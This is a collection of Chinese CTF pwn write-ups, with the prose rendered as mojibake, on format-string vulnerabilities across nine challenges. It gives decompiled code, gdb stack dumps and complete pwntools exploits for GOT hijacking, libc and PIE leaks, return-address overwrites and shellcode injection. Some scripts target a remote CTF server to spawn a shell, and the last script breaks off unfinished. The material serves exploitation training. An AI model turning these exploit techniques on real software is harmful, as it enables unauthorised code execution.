å¯ä»¥çœ‹åˆ°ä¼šæ— é™çš„æ‰“å°ä½ è¾“å…¥çš„ä¸œè¥¿ï¼Œå¹¶ä¸”æœ‰systemè¿™ä¸ªå‡½æ•°ï¼Œåˆ©ç”¨æ€è·¯ä¹Ÿå°±æ˜¯GOT hijackï¼ŒæŠŠprintfå‡½æ•°çš„gotæ”¹ä¸ºsystemçš„pltï¼Œæ³¨æ„è¦å•æ¬¡printfå¤šæ¬¡å†™å…¥ï¼Œæ”¹ä¸ºsystemçš„pltåï¼Œå†ä¼ è¿‡å»/bin/shï¼Œæ­¤æ—¶å°±ä¼šå˜æˆsystem(/bin/sh) gdbè°ƒè¯•gdb-peda$ stack 0x20 0000| 0xffffd250 --&gt; 0xffffd26c (\"AAAA\\n\") 0004| 0xffffd254 --&gt; 0x100 0008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b 0012| 0xffffd25c --&gt; 0x0 0016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f40 0020| 0xffffd264 --&gt; 0x80482e7 (\"__libc_start_main\") 0024| 0xffffd268 --&gt; 0xf63d4e2e 0028| 0xffffd26c (\"AAAA\\n\") gdb-peda$ fmtarg 0xffffd26c The index of format argument : 7 (\"\\%6$p\") ç¡®å®šåç§»æ˜¯7ï¼Œæ‰“ç®—ä¸€ä¼šå†™payloadæ—¶å€™éœ€è¦è¡¥é½ï¼Œå°±.ljustè¡¥æˆ0x20çš„ï¼Œä¹Ÿå°±æ˜¯offset = 7 + 0x20/4 = 15 expfrom pwn import * context.log_level = 'debug' context.arch = 'i386' # io = process('./echo') io = remote('node3.buuoj.cn',26990) system_plt = 0x08048400 printf_got = 0x0804A010 def fmt_short(prev,val,idx,byte = 2): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hn\" return result prev = 0 payload = \"\" key = 0x08048400 for i in range(2): payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,15+i) prev = (key &gt;&gt; i*16) &amp; 0xffff payload = payload.ljust(0x20,'a') + p32(printf_got) + p32(printf_got+2) raw_input('-&gt;') io.sendline(payload) io.send('/bin/sh\\x00') io.interactive() æ¢ä¸€ç§å°±æ˜¯ç”¨pwntoolsæ¨¡å—ï¼Œé¢å¯¹32ä½ï¼Œè¿™ç§æƒ…å†µè¿˜æ˜¯å¾ˆå¥½ç”¨çš„ï¼š from pwn import * context.log_level = 'debug' context.arch = 'i386' # io = process('./echo') io = remote('node3.buuoj.cn',26990) system_plt = 0x08048400 printf_got = 0x0804A010 payload = fmtstr_payload(7,&#123;printf_got : system_plt&#125;) io.sendline(payload) io.send('/bin/sh\\x00') io.interactive() [DEBUG] Sent 0x3c bytes: 00000000 10 a0 04 08 11 a0 04 08 12 a0 04 08 13 a0 04 08 â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚ 00000010 25 32 34 30 63 25 37 24 68 68 6e 25 31 33 32 63 â”‚%240â”‚c%7$â”‚hhn%â”‚132câ”‚ 00000020 25 38 24 68 68 6e 25 31 32 38 63 25 39 24 68 68 â”‚%8$hâ”‚hn%1â”‚28c%â”‚9$hhâ”‚ 00000030 6e 25 34 63 25 31 30 24 68 68 6e 0a â”‚n%4câ”‚%10$â”‚hhnÂ·â”‚â”‚ 0000003c å¯ä»¥çœ‹ä¸€ä¸‹å…¶ç”Ÿæˆçš„payloadï¼ŒæŠŠç›®æ ‡åœ°å€ä¿¡æ¯æ”¾åœ¨å¼€å¤´ï¼Œåœ¨64ä½æ˜¯è‚¯å®šæ˜¯ä¸å¯è¡Œçš„ã€‚ jarvisoj_fmidaåˆ†æint __cdecl main(int argc, const char **argv, const char **envp) &#123; char buf; // [esp+2Ch] [ebp-5Ch] unsigned int v5; // [esp+7Ch] [ebp-Ch] v5 = __readgsdword(0x14u); be_nice_to_people(); memset(&amp;buf, 0, 0x50u); read(0, &amp;buf, 0x50u); printf(&amp;buf); printf(\"%d!\\n\", *(_DWORD *)&amp;x); if ( *(_DWORD *)&amp;x != 4 ) return 0; puts(\"running sh...\"); system(\"/bin/sh\"); return 0; &#125; ååˆ†ç®€å•çš„é¢˜ç›®ï¼Œæ£€éªŒ x å€¼æ˜¯å¦ä¸º4ï¼Œå¦‚æœæ˜¯4ï¼ˆæ•°å­—ï¼‰ï¼Œå°±ç›´æ¥ç»™ä½ shelläº†ã€‚ expfrom pwn import * context.log_level = 'debug' # io = process('./fm') io = remote('node3.buuoj.cn',26915) # io.recv() payload = p32(0x0804A02C) + '%11$hn' raw_input('-&gt;') io.sendline(payload) io.interactive() winesap_week6æºç ï¼š#include &lt;stdio.h&gt; int main() &#123; setvbuf(stdout, 0, _IONBF, 0); alarm(180); char str[100]; while(gets(str)) &#123; printf(str); &#125; return 0; &#125; éœ€è¦ç¼–è¯‘ä¸º64ä½ï¼Œè¿™ä¸ªé¢˜æ¯”èµ·æ¥ç¬¬ä¸€ä¸ªä¹Ÿå°±æ˜¯æ²¡æœ‰äº†systemå‡½æ•°ï¼Œéœ€è¦è‡ªå·±æ³„æ¼ä¸€ä¸‹libcçš„baseï¼Œç®—å‡ºsystemåœ°å€ï¼Œç„¶åè¿˜æ˜¯GOT hijackå°±å¯ä»¥äº†ã€‚ EXPfrom pwn import * import time context.arch = 'amd64' context.log_level = 'debug' io = process('./fmt1') elf = ELF('./fmt1') libc = elf.libc printf_got = 0x0000601020 io.sendline('%21$p') io.recvuntil('0x') libc_base = int((io.recv(12)),16) - 240 -libc.symbols['__libc_start_main'] system_addr = libc_base + libc.symbols['system'] print('leak_libc_base: ' + hex(libc_base)) print('system_addr: ' + hex(system_addr)) def fmt_short(prev,val,idx,byte = 2): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hn\" return result prev = 0 payload = \"\" key = system_addr for i in range(3): payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,12+i) prev = (key &gt;&gt; i*16) &amp; 0xffff payload = payload.ljust(0x30,'a') + p64(printf_got) +p64(printf_got+2) + p64(printf_got+4) io.sendline(payload) sleep(1) io.sendline('/bin/sh\\x00') io.interactive() HITCON-Training-lab8æºç #include &lt;stdio.h&gt; int magic = 0 ; int main()&#123; char buf[0x100]; setvbuf(stdout,0,2,0); puts(\"Please crax me !\"); printf(\"Give me magic :\"); read(0,buf,0x100); printf(buf); if(magic == 0xda)&#123; system(\"cat /home/craxme/flag\"); &#125;else if(magic == 0xfaceb00c)&#123; system(\"cat /home/craxme/craxflag\"); &#125;else&#123; puts(\"You need be a phd\"); &#125; &#125; ç¼–è¯‘ä¸º64ä½ã€‚ åˆ†æï¼ˆè¿™ä¸ªé¢˜ç›®æ˜¯çº¯ç²¹å°±æ˜¯ä¸ºäº†ç»ƒä¹ ä»»æ„åœ°å€å†™å…¥çš„ï¼Œæˆ‘è¿™é‡Œå°±ç›´æ¥å†™expæ‹¿sheeläº†ã€‚ï¼‰å¯ä»¥çœ‹åˆ°å½“å†ä¸€æ¬¡printfï¼Œä¹‹åç¨‹åºä¾¿åœæ­¢äº†ï¼Œä¸”ç»“æŸå‰æœ‰putså‡½æ•°ã€‚æ€è·¯å°±æ˜¯å¯ä»¥GOT hijack putå‡½æ•°çš„GOTä¸ºreadå‡½æ•°å“ªé‡Œï¼Œè®©å…¶call putså‡½æ•°æ—¶è¿”å›åˆ°readå‡½æ•°ï¼Œå¹¶ä¸”åœ¨è¿™æ¬¡printfå‡½æ•°æ¼æ´åˆ©ç”¨æ—¶ï¼Œä¹ŸæŠŠprintfå‡½æ•°çš„GOTæ”¹ä¸ºsystemçš„pltï¼Œç„¶åä¼ å…¥/bin/shå³å¯ã€‚ expfrom pwn import * context.log_level = 'debug' context.arch = 'amd64' io = process('./craxme') # io = remote('127.0.0.1',8888) magic = 0x0000060106C io.recvuntil(':') system_plt = 0x04005A0 puts_got = 0x0601018 ret_addr = 0x00400747 printf_got = 0x00601030 key = 0x00400747 key2 = 0x04005A0 def fmt_short(prev,val,idx,byte = 2): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hn\" return result prev = 0 payload = \"\" for i in range(3): payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,26+i) prev = (key &gt;&gt; i*16) &amp; 0xffff for i in range(3): payload +=fmt_short(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,29+i) prev = (key2 &gt;&gt; i*16) &amp; 0xffff payload = payload.ljust(0x80+0x20,'a') + flat([puts_got,puts_got+2,puts_got+4,printf_got,printf_got+2,printf_got+4]) io.sendline(payload) io.interactive() cacti-pwn3ä¿æŠ¤å’Œarch[*] '/media/psf/mypwn2/ctf_wiki/fmt/cctf/pwn3' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) idaåˆ†æè¿™ä¸ªé¢˜æ¨¡æ‹Ÿäº†ä¸€ä¸ªftpæœåŠ¡ã€‚è¿™é‡Œæ§åˆ¶çš„æ˜¯ç™»é™†ã€‚è¿›å…¥åˆ†æä¸€ä¸‹ï¼š char *__cdecl ask_username(char *dest) &#123; char src[40]; // [esp+14h] [ebp-34h] int i; // [esp+3Ch] [ebp-Ch] puts(\"Connected to ftp.hacker.server\"); puts(\"220 Serv-U FTP Server v6.4 for WinSock ready...\"); printf(\"Name (ftp.hacker.server:Rainism):\"); __isoc99_scanf(\"%40s\", src); for ( i = 0; i &lt;= 39 &amp;&amp; src[i]; ++i ) ++src[i]; return strcpy(dest, src); &#125; ç”¨æˆ·åå‡½æ•°ï¼Œå‘ç°å¯¹ä½ è¾“å…¥çš„ä¸œè¥¿è¿›è¡Œè¯¸ä½çš„è¿›è¡ŒåŠ ä¸€ã€‚ int __cdecl ask_password(char *s1) &#123; if ( !strcmp(s1, \"sysbdmin\") ) return puts(\"welcome!\"); puts(\"who you are?\"); exit(1); return puts(\"welcome!\"); &#125; ç”¨æˆ·å¯†ç å‡½æ•°ï¼Œå‘ç°è¦è·Ÿsysbdmin è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœä¸ç›¸ç­‰ï¼Œå°±ç›´æ¥é€€å‡ºã€‚(strcmpå‡½æ•°å¯¹æ¯”ä¸¤ä¸ªå­—ç¬¦ä¸²æ—¶ï¼Œç›¸ç­‰è¿”å›0ï¼Œ!0 = éå‡ = çœŸï¼‰æ‰€ä»¥è¿™ä¸ªç»•è¿‡å°±æ—¶sysbdmin è¯¸ä½å‡1å³å¯ã€‚å‰©ä¸‹çš„å°±æ˜¯è¾“å…¥get put dir,ä¼šè¿›å…¥ä¸åŒçš„åˆ†æ”¯ï¼Œå…¶ä¸­è¾“å…¥getå‡½æ•°ï¼š int get_file() &#123; char dest; // [esp+1Ch] [ebp-FCh] char s1; // [esp+E4h] [ebp-34h] char *i; // [esp+10Ch] [ebp-Ch] printf(\"enter the file name you want to get:\"); __isoc99_scanf(\"%40s\", &amp;s1); if ( !strncmp(&amp;s1, \"flag\", 4u) ) puts(\"too young, too simple\"); for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) ) &#123; if ( !strcmp(i, &amp;s1) ) &#123; strcpy(&amp;dest, i + 40); return printf(&amp;dest); &#125; &#125; return printf(&amp;dest); &#125; è¿™ä¸ªå‡½æ•°æ˜¯æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„ï¼Œå½“ä½ putä¸Šå»ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒä¼šè®©ä½ è¾“å…¥æ–‡ä»¶åå­—å’Œæ–‡ä»¶å†…å®¹ï¼Œç„¶ågetè¿™ä¸ªå‡½æ•°ä¼šæ ¹æ®æ–‡ä»¶åå­—ï¼Œæ¥è¾“å‡ºå…¶å†…å®¹ï¼Œåˆ©ç”¨è¿™ä¸¤ä¸ªå‡½æ•°æ­é…ä¸€ä¸‹å°±å¯ä»¥å®ç°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨äº†ã€‚å¹¶ä¸”åœ¨dirä¸­ï¼Œå…¶ä¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶çš„åå­—ï¼Œç”¨çš„æ˜¯putså‡½æ•°ã€‚ç„¶åå°±æœ‰æ€è·¯åˆ©ç”¨äº†ï¼š ç”±äºæ²¡æœ‰systemå‡½æ•°ï¼Œç„¶åå°±éœ€è¦æƒ³åŠæ³•æ³„æ¼ä¸€ä¸‹libcåœ°å€ï¼Œæ¥ç®—å‡ºsystemçš„å‡½æ•°åœ¨libcçš„åœ°å€ã€‚ ä¿®æ”¹putså‡½æ•°çš„gotä¸ºsystemçš„åœ°å€ï¼Œç„¶åè®°å¾—è¿™ä¸ªæ–‡ä»¶çš„åç§°æ˜¯/bin/sh,è¿™æ ·åœ¨ä½¿ç”¨dirè°ƒç”¨putså‡½æ•°æ—¶ï¼Œå°±å¯ä»¥æ‹¿åˆ°shelläº†ã€‚è¿™é¢˜æ¯”è¾ƒæœ‰è¶£ï¼Œæœ‰ç‚¹éš¾åœ¨åˆ†æè¿™ä¸ªç¨‹åºåœ¨å¹²å˜›ï¼Œåˆ©ç”¨æ€è·¯å€’æ˜¯ä¸éš¾ã€‚ expfrom pwn import * context.log_level = 'debug' context.arch = 'i386' io = process('./pwn3') elf = ELF('./pwn3') libc = elf.libc s = 'sysbdmin' key = '' for i in s: key+=chr(ord(i)-1) print(key) io.sendline(key) info('---------leak libc_base--------') io.recvuntil('&gt;') io.sendline('put') io.recvuntil('upload:') io.sendline('1111') puts_got = elf.got['puts'] io.sendline('%8$s' + p32(puts_got) ) io.recvuntil('&gt;') io.sendline('get') io.recvuntil('get:') io.sendline('1111') puts_addr = u32(io.recv(4)[:4]) print('puts_add:' + hex(puts_addr)) sys_addr = puts_addr - libc.symbols['puts'] + libc.symbols['system'] io.recvuntil('&gt;') info('---------hijack puts_got--------') io.sendline('put') io.recvuntil('upload:') io.sendline('/bin/sh;') payload = fmtstr_payload(7,&#123;puts_got: sys_addr&#125;) io.sendline(payload) io.recvuntil('&gt;') io.sendline('get') io.recvuntil('get:') info('--------- get shell-------') io.sendline('/bin/sh;') io.recvuntil('&gt;') io.sendline('dir') io.interactive() ä¸‰ä¸ªç™½å¸½ - pwnme_k0ä¿æŠ¤å’Œarch[*] '/media/psf/mypwn2/ctf_wiki/fmt/sgbm_pwnme/pwnme_k0' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) å¼€å¯äº†RELROï¼Œè¿™æ ·å°±æ— æ³•ä¿®æ”¹gotäº†ã€‚ idaåˆ†æç¨‹åºå®ç°äº†ä¸€ä¸ªæ³¨å†Œç”¨æˆ·çš„åŠŸèƒ½ï¼Œæ³¨å†Œå¥½åå¯ä»¥æ¥å±•ç¤ºç”¨æˆ·ä¿¡æ¯ï¼Œä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼Œå’Œé€€å‡ºã€‚å…¶ä¸­åœ¨å±•ç¤ºç”¨æˆ·ä¿¡æ¯å½“ä¸­ï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9) &#123; write(0, \"Welc0me to sangebaimao!\\n\", 0x1AuLL); printf(&amp;formata, \"Welc0me to sangebaimao!\\n\"); return printf(&amp;a9 + 4); &#125; å…¶ä¸­å‘ç°å…¶è¾“å‡ºçš„bufå°±æ˜¯ä½ è¾“å…¥çš„å¯†ç ï¼šå¹¶ä¸”è¿˜å‘ç°å…¶ä¸­æœ‰ä¸ªåé—¨å‡½æ•°ï¼Œä¼šè°ƒç”¨systemå‡½æ•°ç»™ä½ shellï¼Œå°±å¯ä»¥å»ä¿®æ”¹ç¨‹åºçš„è¿”å›åœ°å€ï¼Œç›´æ¥è¿”å›åˆ°è¿™é‡Œå°±æ‹¿åˆ°shelläº†ã€‚Gdbè°ƒè¯•å®šä½å…³é”®åœ¨è¿™ä¸ªprintfå½“ä¸­ï¼Œç¡®å®šä¸€ä¸‹ï¼š çœ‹ä¸€ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µï¼Œè¾“å…¥çš„usenameå¯ä»¥ç¡®å®šåç§»æ˜¯8ï¼Œrdiä¹Ÿæ˜¯æŒ‡å‘äº†å­˜æ”¾passwordçš„åœ°å€ã€‚å¹¶ä¸”å‘ç°æ ˆä¸Šä¹Ÿæœ‰å¾ˆå¤šæ ˆçš„åœ°å€ä¿¡æ¯ï¼Œå½“ç¬¬äºŒæ¬¡è¿è¡Œåˆ°è¿™é‡Œçš„æ—¶å€™ï¼Œè¿™é‡Œespå¯¹åº”çš„åœ°å€ä¿¡æ¯ä¹Ÿæ˜¯ä¸ä¼šå˜çš„ï¼Œæ‰€ä»¥å°±å¯ä»¥é€šè¿‡æ³„æ¼è¿™é‡Œçš„å€¼æ¥ç®—å‡ºret addressï¼Œç„¶åä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼Œè¿™ä¸‹æŠŠret addressçš„pointæ”¾åˆ°æ ˆä¸Šï¼Œæ¥ç€å°±å¼€å§‹ä¿®æ”¹ret addressçš„å€¼äº†ã€‚ expfrom pwn import * context.log_level = 'debug' context.arch = 'amd64' io = process('./pwnme_k0') # context.clear(arch = 'amd64') io.recvuntil('lenth:20): \\n') io.sendline('%0006$lx') io.recvuntil('lenth:20): \\n') io.sendline('11111111') io.recvuntil('&gt;') io.sendline('1') # io.recvuntil('Welc0me to sangebaimao!\\n') stack = int(io.recvline_contains('7f'),16) print(stack) ret_add = stack - 0x38 # system_add = 0x04008AA payload = '%2218c%8$hn' io.recvuntil('&gt;') io.sendline('2') io.recvuntil('lenth:20): \\n') io.sendline(p64(ret_add)) io.recvuntil('lenth:20): \\n') io.sendline(payload) io.recvuntil('&gt;') io.sendline('1') io.interactive() inndy-echo2ä¿æŠ¤å’Œarch[*] '/media/psf/mypwn2/buuctf/inndy_echo2/echo2' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled å¯ä»¥çœ‹åˆ°å¼€å¯äº†pieï¼Œè¿™æ—¶å€™å°±éœ€è¦æ¥æ³„æ¼ä¸€ä¸‹pieçš„åŸºåœ°å€ã€‚ idaåˆ†ævoid __noreturn echo() &#123; char s; // [rsp+0h] [rbp-110h] unsigned __int64 v1; // [rsp+108h] [rbp-8h] v1 = __readfsqword(0x28u); do &#123; fgets(&amp;s, 256, stdin); printf(&amp;s, 256LL); &#125; while ( strcmp(&amp;s, \"exit\\n\") ); system(\"echo Goodbye\"); exit(0); &#125; ä»£ç æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œè¿˜æ˜¯got hijack å°±è¡Œäº†ã€‚éš¾ç‚¹ä¹Ÿæ˜¯å¦‚ä½•æ¥å¤„ç†è¿™ä¸ªpieä¿æŠ¤ã€‚ gdb è°ƒè¯•=&gt; 0x555555554984 &lt;echo+68&gt;: call 0x5555555547a0 &lt;printf@plt&gt; 0x555555554989 &lt;echo+73&gt;: lea rax,[rbp-0x110] 0x555555554990 &lt;echo+80&gt;: lea rsi,[rip+0xfd] # 0x555555554a94 0x555555554997 &lt;echo+87&gt;: mov rdi,rax 0x55555555499a &lt;echo+90&gt;: call 0x5555555547d0 &lt;strcmp@plt&gt; æ‰¾åˆ°å…³é”®ç‚¹ï¼Œç„¶åçœ‹ä¸€ä¸‹æ ˆæƒ…å†µï¼š 0192| 0x7fffffffe1c0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087 --More--(25/48) 0200| 0x7fffffffe1c8 --&gt; 0x7ffff7a88947 (&lt;_IO_default_setbuf+23&gt;: cmp eax,0xffffffff) 0208| 0x7fffffffe1d0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087 0216| 0x7fffffffe1d8 --&gt; 0x7ffff7fd8700 (0x00007ffff7fd8700) 0224| 0x7fffffffe1e0 --&gt; 0x555555554810 (&lt;_start&gt;: xor ebp,ebp) 0232| 0x7fffffffe1e8 --&gt; 0x7ffff7a85439 (&lt;_IO_new_file_setbuf+9&gt;: test rax,rax) 0240| 0x7fffffffe1f0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087 å‘ç°åœ¨0x7fffffffe1e0è¿™é‡Œå°±å¯ä»¥æ³„æ¼å‡ºpieåŸºå€äº†ï¼Œç¡®å®šåç§»æ˜¯34ã€‚ç„¶åå‰©ä¸‹çš„å°±ç®€å•äº†ï¼Œç›´æ¥idaé‡Œé¢æŸ¥çœ‹ä¸‹pltå’Œgot ï¼ŒåŠ ä¸Šä»¥åå°±å¾—åˆ°äº†çœŸæ­£çš„pltå’Œgotåœ°å€ã€‚ expfrom pwn import * context.log_level = 'debug' context.arch = 'amd64' io = process('./echo2') # io = remote('node3.buuoj.cn',28200) def leak1(): io.sendline('%34$p') io.recvuntil('0x') p_bass_addr = int((io.recv(9)+'000'),16) return p_bass_addr p_bass_addr = leak1() print('p_bass_addr -&gt;' + hex(p_bass_addr)) print_got = 0x201020 + p_bass_addr print('print_got -&gt;' + hex(print_got)) system_plt = 0x790 + p_bass_addr print('system_plt -&gt;' + hex(system_plt)) def fmt(prev,val,idx,byte = 2): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hn\" return result prev = 0 payload = \"\" key = system_plt for i in range(3): payload +=fmt(prev,(key &gt;&gt; 16*i) &amp; 0xffff,14+i) prev = (key &gt;&gt; i*16) &amp; 0xffff payload = payload.ljust(0x40,'a') + flat([print_got,print_got+2,print_got+4]) # raw_input('-&gt;') io.sendline(payload) sleep(0.1) io.sendline('/bin/sh\\x00') io.interactive() -â€” ** æ¥ä¸‹æ¥çš„é¢˜ï¼Œéƒ½æ˜¯bufä¸å†æ ˆçš„ä¸Šçš„é¢˜ç›®ã€‚** plaidctf2015-ebpä¿æŠ¤å’Œarch[*] '/media/psf/mypwn2/buuctf/plaidctf2015_ebp/ebp' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments å¯ä»¥çœ‹åˆ°nxä¿æŠ¤æ˜¯å…³é—­çš„ï¼Œå¯ä»¥æƒ³åŠæ³•åˆ©ç”¨shellcodeã€‚ idaåˆ†æint __cdecl main(int argc, const char **argv, const char **envp) &#123; int result; // eax while ( 1 ) &#123; result = (int)fgets(buf, 1024, stdin); if ( !result ) break; echo(); &#125; return result; &#125; æ¼æ´å‡½æ•°ï¼š int make_response() &#123; return snprintf(response, 0x400u, buf); &#125; ä»£ç ååˆ†ç®€å•ï¼Œä½†æ˜¯è¿™æ¬¡çš„æ¼æ´å‡½æ•°å˜æˆäº†snprintf ï¼Œæ—¶åˆ»æ³¨æ„åç§»çš„è®¡ç®—æ˜¯é’ˆå¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ã€‚ä¸”bufæ˜¯åœ¨bssæ®µä¸Šçš„ï¼Œå·²ç»å˜å¾—ä¸æ˜¯æˆ‘ä»¬å½“åˆä¸€æ ·ååˆ†çš„å¥½æ§åˆ¶ï¼Œæ­¤æ—¶å°±éœ€è¦æƒ³åŠæ³•å¥½å¥½åˆ©ç”¨æ ˆä¸ŠåŸæ¥æœ‰çš„æ•°æ®ã€‚ gdbè°ƒè¯•gdb-peda$ stack 0x20 0000| 0xffffd320 --&gt; 0x804a480 --&gt; 0x0 0004| 0xffffd324 --&gt; 0x400 0008| 0xffffd328 --&gt; 0x804a080 (\"AAAA\\n\") 0012| 0xffffd32c --&gt; 0xf7fd31b0 --&gt; 0xf7e00000 --&gt; 0x464c457f 0016| 0xffffd330 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;: add esi,0x15815) 0020| 0xffffd334 --&gt; 0x0 0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x0 0028| 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;: mov DWORD PTR [esp],0x804a480) å¯ä»¥çœ‹ä¸€ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µã€‚å¯ä»¥çœ‹åˆ°ä¸Šé¢æœ‰å¾ˆå¤šå¯ä»¥åˆ©ç”¨çš„åœ°å€ä¿¡æ¯ï¼Œå…¶ä¸­æœ€å¸¸ç”¨çš„ä¹Ÿæ˜¯ebpé“¾ ï¼š 0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x0 ä¹Ÿå°±æ˜¯è¿™ä¸€ä¸ªï¼Œç¬¬ä¸€æ¬¡å¯ä»¥é€šè¿‡åˆ©ç”¨0xffffd338ï¼ˆebp1ï¼‰è¿™ä¸ªåœ°å€ï¼Œå…¶æŒ‡å‘0xffffd358 ï¼ˆebp2ï¼‰ï¼Œç„¶ååˆ©ç”¨%xc%4$hhn å°±å¯ä»¥ä¿®æ”¹0xffffd378ï¼ˆebp3ï¼‰ã€‚å°†0xffffd378 æ”¹ä¸ºæŒ‡å‘ret addressçš„æ ˆåœ°å€ 0xffffd33c ï¼š 0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;: mov DWORD PTR [esp],0x804a480) 0028| 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;: mov DWORD PTR [esp],0x804a480) æ”¹å®Œä¹Ÿå°±æ˜¯è¿™æ ·çš„æ•ˆæœã€‚è¿™æ ·å°±åˆå¯ä»¥é€šè¿‡åˆ©ç”¨ 0xffffd358 ï¼ˆebp2ï¼‰ï¼Œå…¶æŒ‡å‘ 0xffffd33cï¼ˆebp3ï¼‰ï¼Œæ¥ç€å°±ç®—ä¸€ä¸‹0xffffd358 ï¼ˆebp2ï¼‰çš„åç§» yï¼Œç„¶ååˆ©ç”¨%xc%y$hhn å°±å¯ä»¥ä¿®æ”¹0x804852cï¼ˆret addressï¼‰ è¿™æ ·æ”»å‡»æ€è·¯ä¹Ÿå°±å‡ºæ¥äº†ï¼Œå¯ä»¥ä¿®æ”¹retaddress ï¼Œè¿”å›åœ¨å¯æ§çš„buf ä¸Šé¢æ”¾å¥½shellcode ï¼Œæ§åˆ¶ç¨‹åºè·³åˆ°shellcodeå³å¯ã€‚ expfrom pwn import * import time context.log_level = 'debug' context.arch = 'i386' io = process('./ebp') # io = remote('node3.buuoj.cn',29994) buf = 0x0804a080 + 0x40 #0x804a0c0 raw_input('-&gt;') io.sendline('%4$p') ret_stack_addr = int(io.recv(10),16) - 28 print('leak ret_stack_addr:'+hex(ret_stack_addr)) key1 = int(str(hex(ret_stack_addr))[-2:],16) key2 = 0xa0c0 payload = '%&#123;&#125;c%4$hhn'.format(key1) raw_input('-&gt;') io.sendline(payload) io.recv() payload = '%&#123;&#125;c%12$hn'.format(key2) payload = payload.ljust(0x40) payload += asm(shellcraft.sh()) io.sendline(payload) io.interactive() hitcontraining-playfmtä¿æŠ¤å’Œarch[*] '/media/psf/mypwn2/buuctf/hitcontraining_playfmt/playfmt' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments æ²¡æœ‰ä»»ä½•ä¿æŠ¤ã€‚ idaåˆ†æint do_fmt() &#123; int result; // eax while ( 1 ) &#123; read(0, buf, 0xC8u); result = strncmp(buf, \"quit\", 4u); if ( !result ) break; printf(buf); &#125; return result; &#125; ä¸Šå±‚æœ‰play å’Œ mainå‡½æ•°ï¼Œä¸€å…±ä¸‰å±‚ï¼Œåœ¨ç¬¬ä¸‰å±‚çš„è¿™ä¸ªå‡½æ•°å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè®©æˆ‘ä»¬å¾ˆæ–¹ä¾¿çš„ç”¨ebpé“¾æ¥åšé¢˜ã€‚ç„¶åï¼Œæœ‰æ— é™æ¬¡çš„è§¦å‘è¿™ä¸ªæ¼æ´çš„æœºä¼šã€‚ æ”»å‡»æ€è·¯ ï¼šå› ä¸ºæ²¡æœ‰å¼€nxä¿æŠ¤ï¼Œä¹Ÿå°±ä»¥ä¸ºç€å¯ä»¥ç”¨shellcodeè¿›è¡Œæ”»å‡»ã€‚ç„¶åè¿˜æ˜¯æ”¹è¿”å›åœ°å€ï¼Œæå‰åœ¨å¯æ§çš„bufåˆé€‚çš„åœ°æ–¹æ‘†ä¸Šshellcodeï¼Œç„¶åè·³ä¸Šå»å³å¯ã€‚ gdbåˆ†æ å¦‚å›¾æ‰€ç¤ºï¼Œåˆ©ç”¨è¿™ä¸ªé“¾å³å¯ã€‚å…ˆæƒ³åŠæ³•æŠŠOxffffd358 æ”¹æˆ Oxffffd33c : ç„¶ååœ¨æƒ³åŠæ³•æŠŠ0x8048507 è¿™ä¸ªè¿”å›åœ°å€æ”¹æˆæˆ‘ä»¬æ‘†æ”¾çš„shellcodeçš„åœ°å€å³å¯ã€‚ expfrom pwn import * import time context.log_level = 'debug' context.arch = 'i386' io = process('./playfmt') # io = remote('node3.buuoj.cn',26382) buf = 0x0804A060 + 0x40 #0x804a0a0 offset1 = 6 offset2 = 10 info('---leak stack address---') 